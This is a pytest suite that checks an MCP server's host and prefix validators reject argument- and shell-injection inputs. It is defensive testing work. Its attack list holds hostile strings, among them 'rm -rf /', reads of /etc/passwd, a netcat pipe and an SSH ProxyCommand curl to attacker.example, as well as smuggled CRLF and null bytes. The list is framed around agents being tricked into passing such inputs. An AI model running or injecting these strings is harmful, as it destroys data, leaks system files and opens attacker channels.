"""
Prompt-injection / argument-injection test suite for mcp_server.

Verifies that _validate_host (and the safe subprocess pattern) rejects
adversarial inputs the agent might be tricked into passing.
"""

import pytest

ATTACKS = [
    # Shell metacharacter injection
    "leaf1; rm -rf /",
    "leaf1 && cat /etc/passwd",
    "leaf1 | nc attacker.example 4444",
    "leaf1`whoami`",
    "leaf1$(id)",
    "leaf1 > /tmp/pwn",
    # SSH option injection
    "leaf1 -o ProxyCommand=curl attacker.example",
    "-oProxyCommand=evil leaf1",
    "leaf1\n-oProxyCommand=evil",
    # Path traversal in hostname
    "../../etc/passwd",
    "leaf1/../spine1",
    # Null byte / CRLF injection
    "leaf1\x00rm",
    "leaf1\r\nrm -rf /",
    # Unicode lookalikes (Cyrillic 'e' in leaf)
    "lеaf1",
    "leaf1​",  # zero-width space
    # IPv4 lookalikes
    "10.0.0.1.evil.com",
    "999.999.999.999",
    "10.0.0",
    # Empty / whitespace
    "",
    "   ",
    "\t\n",
]


@pytest.mark.parametrize("attack", ATTACKS)
def test_validate_host_rejects(attack):
    from tools.validation import validate_host
    with pytest.raises(ValueError):
        validate_host(attack)


def test_validate_host_accepts_legit():
    from tools.validation import validate_host
    assert validate_host("spine1") == "spine1"
    assert validate_host("leaf1") == "leaf1"
    assert validate_host("leaf2") == "leaf2"
    assert validate_host("10.0.0.1") == "10.0.0.1"
    assert validate_host("192.168.1.254") == "192.168.1.254"


def test_prefix_filter_rejects_injection():
    """validate_prefix must reject shell metacharacters."""
    from tools.validation import validate_prefix
    bad_prefixes = [
        "1.1.1.0/24; rm -rf /",
        "1.1.1.0/24 && id",
        "1.1.1.0/24`whoami`",
        "../../etc/passwd",
    ]
    for p in bad_prefixes:
        with pytest.raises(ValueError):
            validate_prefix(p)

